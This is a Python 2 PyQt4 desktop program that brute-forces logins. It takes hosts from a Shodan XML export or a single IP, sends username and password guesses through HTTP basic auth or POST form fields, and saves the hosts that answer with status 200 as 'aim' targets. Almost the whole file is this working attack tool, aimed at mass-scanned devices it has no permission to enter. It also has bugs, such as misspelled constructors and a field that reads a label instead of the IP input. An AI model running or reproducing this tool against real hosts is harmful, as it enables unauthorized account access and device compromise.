# Programm written by Zuzin Vladimir. @All right reserved.

import sys
from lxml import objectify, etree
import requests
import os
from PyQt4 import QtGui, QtCore

# Class for thread
class GetThreadSingleIP(QtCore.QThread):
    def __init__(self, parent=None):
        QtCore.QThread.__init__(self, parent)

    def run(self):
        fileListUser = open(wayListUser, 'r')
        fileListPass = open(wayListPass, 'r')
        List_User_list = fileListUser.readlines()
        List_Pass_list = fileListPass.readlines()
        url = http + SingleIP + AddIP
        global summip
        summip=len(List_User_list)
        count =0
        for i in List_User_list:
            count+=1
            for j in List_Pass_list:
                try:
                    if flagSSL == 1:
                        r = requests.get(url, auth=(i, j ), timeout=1, verify=True)  #attempt to authenticate
                    else:
                        r = requests.get(url, auth=(i, j), timeout=1)
                    if r.status_code == 200:
                        print SingleIP
                        print i
                        print j
                        if flagVerbal == 1:
                            self.emit(QtCore.SIGNAL("aim(QString)"), SingleIP)
                except:
                    pass
            self.emit(QtCore.SIGNAL("mysignal(int)"), count)


class PostThreadSingleIP(QtCore.QThread):
    def _init_(self, parent=None):
        QtCore.QThread._init_(self, parent)

    def run(self):
        fileListUser = open(wayListUser, 'r')
        fileListPass = open(wayListPass, 'r')
        List_User_list = fileListUser.readlines()
        List_Pass_list = fileListPass.readlines()
        print List_User_list
        print List_Pass_list
        fileListUser.close()
        fileListPass.close()
        url = http + SingleIP + AddIP
        global summip
        summip=len(List_User_list)
        count =0
        print 'run thread'
        for i in List_User_list:
            count+=1
            for j in List_Pass_list:
                try:
                    if flagSSL:
                        r = requests.post(url, params={formLogin:i, formPassword:j}, timeout=1,
                                              verify=True)  #attempt to authenticate
                    else:
                        r = requests.post(url, params={formLogin:i, formPassword:j}, timeout=1)
                    if r.status_code == 200:
                        print SingleIP
                        print i
                        print j
                        if flagVerbal:
                              self.emit(QtCore.SIGNAL("aim(QString)"), SingleIP)
                    else:
                        print 'bad'
                except:
                    pass
            self.emit(QtCore.SIGNAL("mysignal(int)"), count)  #emit signals for progressbar

class GetThread(QtCore.QThread):
    def __init__(self, parent=None):
        QtCore.QThread.__init__(self, parent)

    def run(self, true=None):
        xml_way = str(way)  #the way to xml
        node = etree.parse(xml_way)  #parsing xml file
        nodes = node.xpath('/shodan/host')  #isolate tag
        listip = open('listip.txt', 'w')
        listofip = []
        for n in nodes:
            listofip.append(n.get('ip'))
        global summip
        summip = len(listofip)
        for i in listofip:
            listip.write(i)
            listip.write('\n')
        listip.close()
        global goodip
        goodip=[]
        count = 0
        for k in listofip:
            url = http + k + AddIP
            count += 1
            try:
                if flagSSL:
                    r = requests.get(url, auth=(LOGIN, PASS), timeout=1, verify=true)  #attempt to authenticate
                else:
                    r = requests.get(url, auth=(LOGIN, PASS), timeout=1)
                if r.status_code == 200:
                    print k
                    goodip.append(k)
                    if flagVerbal:
                        self.emit(QtCore.SIGNAL("aim(QString)"), k)
            except:
                pass
            self.emit(QtCore.SIGNAL("mysignal(int)"), count)  #emit signals for progressbar

class PostThread(QtCore.QThread):
    def _init_(self, parent=None):
        QtCore.QThread._init_(self, parent)

    def run(self, true=None):
        xml_way = str(way)  #the way to xml
        node = etree.parse(xml_way)  #parsing xml file
        nodes = node.xpath('/shodan/host')  #isolate tag
        listip = open('listip.txt', 'w')
        listofip = []
        for n in nodes:
            listofip.append(n.get('ip'))
        global summip
        summip = len(listofip)
        for i in listofip:
            listip.write(i)
            listip.write('\n')
        listip.close()
        #goodip=open('goodip.txt','w')
        global goodip
        goodip=[]
        count = 0
        for k in listofip:
            url = http + k+ AddIP
            count += 1
            try:
               if flagSSL:
                    r = requests.post(url, params={formLogin: LOGIN, formPassword: PASS}, timeout=1,
                                      verify=True)  #attempt to authenticate
               else:
                r = requests.post(url, params={formLogin: LOGIN, formPassword: PASS}, timeout=1)
                if r.status_code == 200:
                    print k
                    goodip.append(k)
                    if flagVerbal:
                       self.emit(QtCore.SIGNAL("aim(QString)"), k)
            except:
                pass
            self.emit(QtCore.SIGNAL("mysignal(int)"), count)  #emit signals for progressbar

# Class for GUI
class GUI(QtGui.QWidget):
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)

        self.thread = GetThread()
        self.thread2 = PostThread()
        self.thread3 = GetThreadSingleIP()
        self.thread4 = PostThreadSingleIP()
        self.setWindowTitle('Programm')
        pal = self.palette()
        pal.setBrush(QtGui.QPalette.Normal, QtGui.QPalette.Window,
                     QtGui.QBrush(QtGui.QPixmap("picture.jpg")))
        self.setPalette(pal)
        self.lineAddIP = QtGui.QLineEdit(self)
        self.lineAddIP.setStyleSheet("background-color:#E6E6FA;")
        self.linefiledial = QtGui.QLineEdit(self)
        self.linefiledial.setStyleSheet("background-color:#E6E6FA;")
        self.lineLOGIN = QtGui.QLineEdit(self)
        self.lineLOGIN.setStyleSheet("background-color:#E6E6FA;")
        self.linePASS = QtGui.QLineEdit(self)
        self.linePASS.setStyleSheet("background-color:#E6E6FA;")
        self.listAim = QtGui.QTextEdit(self)
        self.listAim.setStyleSheet("background-color:#E6E6FA;")
        self.formLoginP = QtGui.QLineEdit(self)
        self.formLoginP.setStyleSheet("background-color:#E6E6FA;")
        self.formPassP = QtGui.QLineEdit(self)
        self.formPassP.setStyleSheet("background-color:#E6E6FA;")
        self.ssl = QtGui.QCheckBox("SSL", self)
        self.ssl.setStyleSheet("font:Italic;")
        self.verbal = QtGui.QCheckBox("Verbal", self)
        self.verbal.setStyleSheet("font:Italic;")
        self.singleIP = QtGui.QLineEdit(self)
        self.singleIP.setStyleSheet("background-color:#E6E6FA;")
        self.lableSingleIP = QtGui.QLabel("IP")
        self.lableSingleIP.setStyleSheet('font:Italic;')
        self.listUser = QtGui.QLineEdit(self)
        self.listUser.setStyleSheet("background-color:#E6E6FA;")
        self.listPass = QtGui.QLineEdit(self)
        self.listPass.setStyleSheet("background-color:#E6E6FA;")
        self.labelPost = QtGui.QLabel('POST params')
        self.labelPost.setStyleSheet('font:Italic;')

        self.progressBar = QtGui.QProgressBar(self)
        Choose = QtGui.QPushButton("Choose .xml file", self)
        Done = QtGui.QPushButton('RUN', self)
        STOP = QtGui.QPushButton('STOP', self)
        Save = QtGui.QPushButton('SAVE', self)
        ListUser = QtGui.QPushButton('ListUSER', self)
        ListPass = QtGui.QPushButton('ListPASS', self)

        self.POST = QtGui.QRadioButton("POST", self)
        self.GET = QtGui.QRadioButton("GET", self)
        self.IPbutton = QtGui.QRadioButton('Single IP', self)
        self.XMLbutton = QtGui.QRadioButton('XML target list', self)


        # manager of components
        Form1 = QtGui.QGridLayout()
        Form1.addWidget(self.IPbutton, 0, 0, )
        Form1.addWidget(self.XMLbutton, 0, 1, )
        Form1.addWidget(self.singleIP, 1, 0, 1, 2)
        Form1.addWidget(self.lableSingleIP, 1, 3)
        Form1.addWidget(self.linefiledial, 2, 0, 1, 2)
        Form1.addWidget(Choose, 2, 3)

        GroupIP = QtGui.QGroupBox("TARGET MENU")
        GroupIP.setLayout(Form1)

        topLayout3 = QtGui.QVBoxLayout()
        topLayout3.addWidget(self.POST)
        topLayout3.addWidget(self.GET)
        topLayout3.addWidget(self.ssl)
        topLayout3.addWidget(self.verbal)

        GroupMethod = QtGui.QGroupBox("OPTIONS")
        GroupMethod.setLayout(topLayout3)

        Form = QtGui.QFormLayout()
        Form.addRow('IP opt', self.lineAddIP)
        Form.addRow('LOGIN', self.lineLOGIN)
        Form.addRow('PASSWORD', self.linePASS)
        Form.addRow(self.labelPost)
        Form.addRow('for LOGIN', self.formLoginP)
        Form.addRow('for PASS', self.formPassP)

        FormList = QtGui.QFormLayout()
        FormList.addRow(ListUser, self.listUser)
        FormList.addRow(ListPass, self.listPass)

        GroupList = QtGui.QGroupBox('USER/PASS list for single IP')
        GroupList.setLayout(FormList)

        Form2 = QtGui.QGridLayout()
        Form2.addWidget(self.progressBar, 0, 0, 1, 3)
        Form2.addWidget(Done, 1, 0, )
        Form2.addWidget(STOP, 1, 1)
        Form2.addWidget(Save, 1, 2)
        Form2.addWidget(self.listAim, 2, 0, 5, 3)

        GroupUSPASS = QtGui.QGroupBox("LOGIN/PASSWORD for xml list")
        GroupUSPASS.setLayout(Form)

        Horizont = QtGui.QHBoxLayout()
        Horizont.addWidget(GroupMethod)
        Horizont.addWidget(GroupUSPASS)

        Vertical = QtGui.QVBoxLayout()
        Vertical.addWidget(GroupIP)
        Vertical.addLayout(Horizont)
        Vertical.addWidget(GroupList)
        Vertical.addLayout(Form2)

        self.setLayout(Vertical)

        self.connect(Choose, QtCore.SIGNAL('clicked()'), self.showDialog)
        self.connect(Done, QtCore.SIGNAL("clicked()"), self.checkall)
        self.connect(STOP, QtCore.SIGNAL('clicked()'), self.stop)
        self.connect(Save, QtCore.SIGNAL('clicked()'), self.saveDialog)
        self.connect(self.thread, QtCore.SIGNAL("mysignal(int)"),
                     self.on_change, QtCore.Qt.QueuedConnection)  #reciever of thread signals
        self.connect(self.thread2, QtCore.SIGNAL("mysignal(int)"),
                     self.on_change, QtCore.Qt.QueuedConnection)
        self.connect(self.thread3, QtCore.SIGNAL("mysignal(int)"),
                     self.on_change, QtCore.Qt.QueuedConnection)
        self.connect(self.thread4, QtCore.SIGNAL("mysignal(int)"),
                     self.on_change, QtCore.Qt.QueuedConnection)
        self.connect(self.thread, QtCore.SIGNAL("aim(QString)"), self.textChange, QtCore.Qt.QueuedConnection)
        self.connect(self.thread2, QtCore.SIGNAL("aim(QString)"), self.textChange, QtCore.Qt.QueuedConnection)
        self.connect(self.thread3, QtCore.SIGNAL("aim(QString)"), self.textChange, QtCore.Qt.QueuedConnection)
        self.connect(self.thread4, QtCore.SIGNAL("aim(QString)"), self.textChange, QtCore.Qt.QueuedConnection)
        self.connect(ListUser, QtCore.SIGNAL('clicked()'), self.showListUser)
        self.connect(ListPass, QtCore.SIGNAL('clicked()'), self.showListPass)
        self.connect(self.IPbutton, QtCore.SIGNAL("toggled(bool)"), self.IP_activate)
        self.connect(self.XMLbutton, QtCore.SIGNAL("toggled(bool)"), self.XML_activate)
        global formLogin
        formLogin = str(self.formLoginP.text())
        global formPassword
        formPassword = str(self.formPassP.text())
        global AddIP
        AddIP = str(self.lineAddIP.text())
        global LOGIN
        LOGIN = str(self.lineLOGIN.text())
        global PASS
        PASS = str(self.linePASS.text())
        global userList
        userList = str(self.listUser.text())
        global userPass
        userPass = str(self.listPass.text())
        global fileDial
        fileDial = str(self.linefiledial.text())
        global MainFlag
        global checkXMLlist
    def IP_activate(self):
        self.singleIP.clear()
        self.singleIP.setReadOnly(False)
        self.singleIP.setStyleSheet("background-color:#E6E6FA;")
        self.listUser.clear()
        self.listUser.setReadOnly(False)
        self.listUser.setStyleSheet("background-color:#E6E6FA;")
        self.listPass.clear()
        self.listPass.setReadOnly(False)
        self.listPass.setStyleSheet("background-color:#E6E6FA;")
        self.linefiledial.setReadOnly(True)
        self.linefiledial.setStyleSheet("background-color:#FF6347;")
        self.lineLOGIN.setReadOnly(True)
        self.lineLOGIN.setStyleSheet("background-color:#FF6347;")
        self.linePASS.setReadOnly(True)
        self.linePASS.setStyleSheet("background-color:#FF6347;")

    def XML_activate(self):
        self.linefiledial.clear()
        self.linefiledial.setReadOnly(False)
        self.linefiledial.setStyleSheet("background-color:#E6E6FA;")
        self.lineLOGIN.clear()
        self.lineLOGIN.setReadOnly(False)
        self.lineLOGIN.setStyleSheet("background-color:#E6E6FA;")
        self.linePASS.clear()
        self.linePASS.setReadOnly(False)
        self.linePASS.setStyleSheet("background-color:#E6E6FA;")
        self.singleIP.setReadOnly(True)
        self.singleIP.setStyleSheet("background-color:#FF6347;")
        self.listUser.setReadOnly(True)
        self.listUser.setStyleSheet("background-color:#FF6347;")
        self.listPass.setReadOnly(True)
        self.listPass.setStyleSheet("background-color:#FF6347;")

    def showDialog(self):
        global way
        way = QtGui.QFileDialog.getOpenFileName(self, 'Open file', '/home')
        self.linefiledial.setText(way)

    def showListUser(self):
        global wayListUser
        wayListUser = QtGui.QFileDialog.getOpenFileName(self, 'Open file', '/home')
        self.listUser.setText(wayListUser)

    def showListPass(self):
        global wayListPass
        wayListPass = QtGui.QFileDialog.getOpenFileName(self, 'Open file', '/home')
        self.listPass.setText(wayListPass)

    def checkall(self):
        global http
        global flagSSL
        if self.ssl.isChecked():
            http = 'https://'
            flagSSL = True
        else:
            http = 'http://'
            flagSSL = False
        global flagVerbal
        if self.verbal.isChecked():
            flagVerbal =True
        else:
            flagVerbal =False
        self.listAim.clear()
        self.listAim.setText('Start process...')
        if self.XMLbutton.isChecked():
            self.checkXml()
        else:
            self.checkSingleIP()

    def checkXml(self):
        list=[str(self.linefiledial.text()),str(self.lineLOGIN.text()),str(self.linePASS.text())]
        k=0
        for i in list:
            if i:
                k+=1
            else:
                k+=0
        print k
        if k==3:
            self.runXML()
        else:
            self.check()

    def check(self):
        list=[self.linefiledial,self.lineLOGIN,self.linePASS]
        print list
        for i in list:
            if str(i.text()):
                pass
            else:
                i.setText('You need to fill me')

    def checkSingleIP(self):
        list2=[str(self.singleIP.text()),str(self.listUser.text()),str(self.listPass.text())]
        l=0
        for j in list2:
            if j:
                l+=1
            else:
                l+=0
        print l
        if l==3:
            self.runIP()
        else:
            self.check2()

    def check2(self):
        list2=[self.singleIP,self.listUser,self.listPass]
        print list
        for j in list2:
            if str(j.text()):
                pass
            else:
                j.setText('You need to fill me')
    def runXML(self):
        if self.POST.isChecked():
            self.thread2.start()
        elif self.GET.isChecked():
            self.thread.start()
        else:
            self.listAim.append('You need to choose POST or GET method')

    def runIP(self):
        print'run ip'
        global SingleIP
        SingleIP = str(self.lableSingleIP.text())
        if self.POST.isChecked():
            self.thread4.start()
        elif self.GET.isChecked():
            self.thread3.start()

    def on_change(self, s):
        self.progressBar.setMinimum(0)
        self.progressBar.setMaximum(summip)
        self.progressBar.setValue(s)

    def textChange(self, k):
        self.listAim.append(k)

    def saveDialog(self):
        global saveWay
        saveWay = QtGui.QFileDialog.getSaveFileName(self, "Save file", "", ".txt")
        f=open(saveWay,'w')
        for i in goodip:
           f.write(i)
           f.write('\n')
        f.close()

    def stop(self):
        self.thread.terminate()
        self.progressBar.reset()


app = QtGui.QApplication(sys.argv)
qb = GUI()
qb.show()
sys.exit(app.exec_())